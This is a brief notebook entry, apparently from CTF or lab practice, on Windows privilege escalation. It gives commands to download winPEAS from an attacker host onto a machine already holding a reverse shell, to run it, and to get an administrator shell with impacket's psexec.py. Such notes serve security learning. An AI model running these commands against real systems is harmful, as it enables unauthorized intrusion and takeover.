There are several tools that can help us escalate privileges on Windows machines.

- [winPEAS.exe](#wpeas)
- [psexec.py](#pspy)


## winPEAS.exe <a name="wpeas"></a>

winPEAS.exe is an executable that, once we have a reverse shell, will display files with possible critical information in red.

Example:

1. First, download it using PowerShell:
````bash
wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe
````
2.  Switch to PowerShell in your terminal: 
````bash
powershell
````
3. Finally, execute winPEAS.exe:
````bash
C:\Users\sql_svc\Downloads> .\winPEASx64.exe
````



## psexec.py <a name="pspy"></a>

- psexec.py is a tool from impacket that allows us to obtain a shell as an administrator.

````bash
python3 psexec.py administrator@{TARGET_IP}
````